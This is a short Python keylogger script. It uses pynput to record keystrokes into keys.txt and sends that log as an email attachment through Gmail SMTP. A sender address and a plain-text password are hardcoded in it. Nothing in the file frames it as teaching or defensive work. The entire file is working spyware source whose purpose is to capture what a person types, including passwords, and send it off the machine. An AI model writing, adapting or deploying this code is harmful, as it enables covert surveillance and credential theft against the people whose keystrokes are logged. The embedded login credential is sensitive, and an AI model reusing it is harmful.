from email.mime.text import MIMEText

from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import smtplib


count = 0
keys = []
path = r"C:\MIS\keys.txt"
log_file = "keys.txt"

# Email: smtp functionality

email_address = "ngomelikibuba@gmail.com"
password = "KivaNgoMeli-2"

destination_email = "ngomelikibuba@gmail.com"


def send_email(filename, attachment, to_address):
    from_address = email_address
    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = "Log File"
    body = "Here is an attachment"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('content-Disposition', "attachment; filename = %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP("smtp.gmail.com", 587)
    s.starttls()
    s.login(from_address, password)
    text = msg.as_string()
    s.sendmail(from_address, to_address, text)
    s.quit()


send_email(log_file, path, destination_email)


def on_key_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} has been pressed".format(key))

    if count >= 5:
        count = 0
        parse_input_to_file(keys)
        keys = []


def on_key_released(key):
    if key == Key.esc:
        return False


def parse_input_to_file(keys):
    with open(log_file, "w") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write('\n')
            elif k.find("Key") == -1:
                file.write(k)


with Listener(on_press=on_key_press, on_release=on_key_released) as listener:
    listener.join()
